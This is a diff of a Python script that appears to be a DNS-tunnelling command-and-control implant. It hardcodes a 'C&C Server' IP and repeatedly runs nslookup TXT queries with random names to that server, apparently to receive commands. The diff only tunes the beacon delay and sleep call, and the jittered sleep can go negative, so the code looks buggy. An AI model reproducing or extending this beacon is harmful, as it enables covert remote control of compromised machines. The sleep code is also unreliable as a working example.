@@ -10,7 +10,7 @@ RAND_MIN_LEN = 50
 RAND_MAX_LEN = 57
 
 CCIP = '10.4.18.65'  # C&C Server
-QUERY_DELAY = 3  # In seconds
+QUERY_DELAY = 10  # In seconds
 
 lastcommand = ''  # The previous command received
 
@@ -114,7 +114,7 @@ if __name__ == "__main__":
             randomname = generate_randomname()
             print('[+] Sending DNS query: ' + randomname)
             os.system('nslookup -q=txt ' + randomname + ' ' + CCIP + ' > /dev/null')
-            time.sleep(random.uniform(-0.25, 0.25) * QUERY_DELAY)
+            time.sleep(int(random.uniform(-0.25, 0.25) * QUERY_DELAY))
         except KeyboardInterrupt:
             break
     
